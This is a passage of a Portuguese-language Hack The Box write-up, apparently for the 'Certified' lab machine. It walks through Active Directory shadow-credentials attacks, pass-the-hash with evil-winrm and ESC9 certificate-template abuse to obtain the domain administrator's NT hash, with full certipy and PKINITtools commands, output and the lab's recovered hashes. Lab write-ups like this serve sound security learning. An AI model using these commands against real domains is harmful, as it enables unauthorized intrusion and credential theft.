+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating KeyCredential
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> KeyCredential generated with DeviceID: e47e562c-9fda-5ce2-133c-d9fd0d2c30dc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating the msDS-KeyCredentialLink attribute of management_svc
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Updated the msDS-KeyCredentialLink attribute of the target object
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Saved PFX <span style="color:#f92672">(</span><span style="color:#75715e">#PKCS12) certificate &amp; key at path: out.pfx</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Must be used with password: lYu56sxIfremvd8Zycep
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 gettgtpkinit.py -cert-pfx out.pfx -pfx-pass lYu56sxIfremvd8Zycep certified.htb/management_svc management_svc.ccache
+</span></span><span style="display:flex;"><span>2024-12-11 03:10:35,549 minikerberos INFO     Loading certificate and key from file
+</span></span><span style="display:flex;"><span>INFO:minikerberos:Loading certificate and key from file
+</span></span><span style="display:flex;"><span>2024-12-11 03:10:35,562 minikerberos INFO     Requesting TGT
+</span></span><span style="display:flex;"><span>INFO:minikerberos:Requesting TGT
+</span></span><span style="display:flex;"><span>2024-12-11 03:10:35,976 minikerberos INFO     AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>INFO:minikerberos:AS-REP encryption key <span style="color:#f92672">(</span>you might need this later<span style="color:#f92672">)</span>:
+</span></span><span style="display:flex;"><span>2024-12-11 03:10:35,976 minikerberos INFO     9e4c48a8c94a3d6563faaac3cf57f0a77ac0136a6be456c7e16c0850b86ef350
+</span></span><span style="display:flex;"><span>INFO:minikerberos:9e4c48a8c94a3d6563faaac3cf57f0a77ac0136a6be456c7e16c0850b86ef350
+</span></span><span style="display:flex;"><span>2024-12-11 03:10:35,979 minikerberos INFO     Saved TGT to file</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ➜  PKINITtools git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗ export KRB5CCNAME<span style="color:#f92672">=</span>management_svc.ccache
+</span></span><span style="display:flex;"><span><span style="color:#f92672">(</span>venv<span style="color:#f92672">)</span> ➜  PKINITtools git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗ python3 getnthash.py -key 9e4c48a8c94a3d6563faaac3cf57f0a77ac0136a6be456c7e16c0
+</span></span><span style="display:flex;"><span>850b86ef350 certified.htb/management_svc
+</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using TGT from cache
+</span></span><span style="display:flex;"><span>/home/art/bin/PKINITtools/getnthash.py:144: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and schedul
+</span></span><span style="display:flex;"><span>ed <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span>
+</span></span><span style="display:flex;"><span>/home/art/bin/PKINITtools/getnthash.py:192: DeprecationWarning: datetime.datetime.utcnow<span style="color:#f92672">()</span> is deprecated and schedul
+</span></span><span style="display:flex;"><span>ed <span style="color:#66d9ef">for</span> removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now<span style="color:#f92672">(</span>
+</span></span><span style="display:flex;"><span>datetime.UTC<span style="color:#f92672">)</span>.
+</span></span><span style="display:flex;"><span>  now <span style="color:#f92672">=</span> datetime.datetime.utcnow<span style="color:#f92672">()</span> + datetime.timedelta<span style="color:#f92672">(</span>days<span style="color:#f92672">=</span>1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting ticket to self with PAC
+</span></span><span style="display:flex;"><span>Recovered NT Hash
+</span></span><span style="display:flex;"><span>a091c1832bcdd4677c28b5a6a1295584</span></span></code></pre></div><p>Agora temos a Hash <code>a091c1832bcdd4677c28b5a6a1295584</code>  do usuário management_svc e podemos nos autenticar como ele usando <code>Pass the Hash</code> e, como esse usuário tem <code>CanPSRemote</code>  na máquina, podemos nos conectar usando evil-winrm e a hash do usuário: <code>evil-winrm -i 10.10.11.41 -u management_svc -H a091c1832bcdd4677c28b5a6a1295584</code> </p>
+<figure><img src="/assets/image%20%28186%29.png">
+</figure>
+
+<h2 id="shell-como-ca-operator">Shell como CA Operator<a class="anchor" href="#shell-como-ca-operator" aria-label="Link"></a></h2>
+<p>Agora como management_svc, começo a olhar as conexões desse usuário no grafo do bloodhound, e encontro essa ligação:</p>
+<figure><img src="/assets/image%20%28187%29.png">
+</figure>
+
+<p>Tendo permissão de <code>GenericAll</code>  sobre <code>ca_operator</code>, permite com que <code>management_svc</code> aplique o ataque de <code>Shadow Credentials</code> e consiga a NTHASH de <code>ca_operator</code> </p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad shadow auto -username <span style="color:#e6db74">&#34;management_svc@certified.htb&#34;</span> -hashes :a091c1832bcdd4677c28b5a6a1295584 -account ca_operator
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Targeting user <span style="color:#e6db74">&#39;ca_operator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate generated
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Generating Key Credential
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Key Credential generated with DeviceID <span style="color:#e6db74">&#39;0f2f44fb-9372-a068-5dc9-b4cb22b6eb1e&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Adding Key Credential with device ID <span style="color:#e6db74">&#39;0f2f44fb-9372-a068-5dc9-b4cb22b6eb1e&#39;</span> to the Key Credentials <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_opera
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tor&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully added Key Credential with device ID <span style="color:#e6db74">&#39;0f2f44fb-9372-a068-5dc9-b4cb22b6eb1e&#39;</span> to the Key Credentials f
+</span></span><span style="display:flex;"><span>or <span style="color:#e6db74">&#39;ca_operator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Authenticating as <span style="color:#e6db74">&#39;ca_operator&#39;</span> with the certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: ca_operator@certified.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved credential cache to <span style="color:#e6db74">&#39;ca_operator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_operator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Restoring the old Key Credentials <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_operator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully restored the old Key Credentials <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_operator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;ca_operator&#39;</span>: 8034586795ebaf0427cc3417ebea341c</span></span></code></pre></div><h2 id="x20root---esc9"> ROOT - ESC9<a class="anchor" href="#x20root---esc9" aria-label="Link"></a></h2>
+<p>Nesse momento acabei ficando sem ideias, então minha intenção foi estudar o meu novo acesso como <code>ca_operator</code> e me aprofundar no novo contexto que eu estava inserido. Fazendo esse novo reconhecimento, ao analisar os templates de certificado de autoridade com <code>certipy-ad</code>, acabamos descobrindo que <code>ca_operator</code> está registrado em um template vulnerável a vulnerabilidade <code>ESC9</code>, a qual podemos abusar para conseguir acesso de administrador no sistema.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad find -u <span style="color:#e6db74">&#39;ca_operator&#39;</span> -hashes :8034586795ebaf0427cc3417ebea341c  -dc-ip 10.10.11.41 -vulnerable -enabled</span></span></code></pre></div><figure><img src="/assets/image%20%2823%29.png">
+</figure>
+
+<p>Essa vulnerabilidade é bem documentada, e podemos seguir essa documentação para conseguir explorar com sucesso. No nosso contexto atual temos essas informações para realizar o ataque:</p>
+<pre tabindex="0"><code>Nome do certificado: certified-DC01-CA
+management_svc -&gt; GenericWrite sobre ca_operator
+ca_operator hash: 8034586795ebaf0427cc3417ebea341c</code></pre><p>Os passos realizados são os seguintes:</p>
+<ul>
+<li>o <code>userPrincipalName</code> de ca_operator é modificado para qual usuário queremos a Hash (administrator no nosso caso)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account update -username <span style="color:#e6db74">&#34;management_svc@certified.htb&#34;</span> -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn Administrator
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Updating user <span style="color:#e6db74">&#39;ca_operator&#39;</span>:
+</span></span><span style="display:flex;"><span>    userPrincipalName                   : Administrator
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully updated <span style="color:#e6db74">&#39;ca_operator&#39;</span></span></span></code></pre></div><ul>
+<li>O ceritifcado vulneravel é chamado pelo ca_operator</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad req -username <span style="color:#e6db74">&#34;ca_operator@certified.htb&#34;</span> -hashes :8034586795ebaf0427cc3417ebea341c -target 10.10.11.41 -ca certified-DC01-CA -template CertifiedAuthentication
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>/usr/lib/python3/dist-packages/certipy/commands/req.py:459: SyntaxWarning: invalid escape sequence <span style="color:#e6db74">&#39;\(&#39;</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#34;(0x[a-zA-Z0-9]+) \([-]?[0-9]+ &#34;</span>,
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Requesting certificate via RPC
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Successfully requested certificate
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Request ID is <span style="color:#ae81ff">12</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got certificate with UPN <span style="color:#e6db74">&#39;ca_operator@certified.htb&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Certificate has no object SID
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved certificate and private key to <span style="color:#e6db74">&#39;ca_operator.pfx&#39;</span></span></span></code></pre></div><ul>
+<li>O UPN de ca_operator é modificado para qualquer outro valor</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad account update -username <span style="color:#e6db74">&#34;management_svc@certified.htb&#34;</span> -hashes :a091c1832bcdd4677c28b5a6a1295584 -user ca_operator -upn <span style="color:#e6db74">&#34;ca_operator@certified.htb&#34;</span></span></span></code></pre></div><ul>
+<li>Agora, podemos nos autenticar com o certificado obtido e ler o NTHASH do usuário que estava no UPN no momento em que o certificado foi ixado (Administrator)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>certipy-ad auth -pfx <span style="color:#e6db74">&#39;administrator.pfx&#39;</span> -domain <span style="color:#e6db74">&#34;certified.htb&#34;</span>
+</span></span><span style="display:flex;"><span>Certipy v4.8.2 - by Oliver Lyak <span style="color:#f92672">(</span>ly4k<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using principal: administrator@certified.htb
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to get TGT...
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got TGT
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Saved credential cache to <span style="color:#e6db74">&#39;administrator.ccache&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Trying to retrieve NT hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Got hash <span style="color:#66d9ef">for</span> <span style="color:#e6db74">&#39;administrator@certified.htb&#39;</span>: aad3b435b51404eeaad3b435b51404ee:0d5b49608bbce1751f708748f67e2d34</span></span></code></pre></div><p>Agora, temos a hash do administrator do AD, e podemos nos autenticar utilizando Pass the Hash, e conseguir uma shell através do evil-winrm por exemplo:</p>
+<figure><img src="/assets/image%20%2825%29.png">
+</figure>
+
+</article>
+ 
+      
+
+      <footer class="book-footer">
+        
+  <div class="flex flex-wrap justify-between">
+
+<div>
+
+</div>
+
+<div>
+
+</div>
+
+</div>
+
+<div class="flex flex-wrap justify-between">
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/machines/blurry/" class="flex align-center">
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#backward"></use></svg>
+        <span>Blurry</span>
+      </a>
+    
+    </span>
+    <span>
+    
+      <a href="/docs/ctf/hack-the-box/machines/cicada/" class="flex align-center">
+        <span>Cicada</span>
+        <svg class="book-icon" aria-hidden="true"><use href="/iconset.min.90a7fd302dc1b9bc3c291688faee66a3e60a9209f59b89fa00669e35d6907b3f.svg#forward"></use></svg>
+      </a>
+    
+    </span>
+  </div>
+
+ 
+        
+  
+ 
+        
+        
+  
+ 
+        
+  
+    <script>(function(){document.querySelectorAll("pre:has(code)").forEach(e=>{e.addEventListener("click",e.focus),e.addEventListener("copy",function(t){if(t.preventDefault(),navigator.clipboard){const t=window.getSelection().toString()||e.textContent;navigator.clipboard.writeText(t)}})})})()</script>
+  
+
+      </footer>
+
+      <label for="menu-control" class="hidden book-menu-overlay" aria-hidden="true"></label>
+    </main>
+
+    
+  
+  <aside class="book-toc" aria-label="Table of Contents">
+    <div class="book-toc-content">
+      
+  
+<nav id="TableOfContents">
+  <ul>
+    <li><a href="#recon">Recon</a>
+      <ul>
+        <li><a href="#smb">SMB</a></li>
+        <li><a href="#ad-acl">AD ACL</a></li>
+      </ul>
+    </li>
+    <li><a href="#shell-como-ca-operator">Shell como CA Operator</a></li>
+    <li><a href="#x20root---esc9"> ROOT - ESC9</a></li>
+  </ul>
+</nav>
+
+
+
+
+
+
+
+    </div>
+  </aside>
+  
+ 
+  </div>
+
+  
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
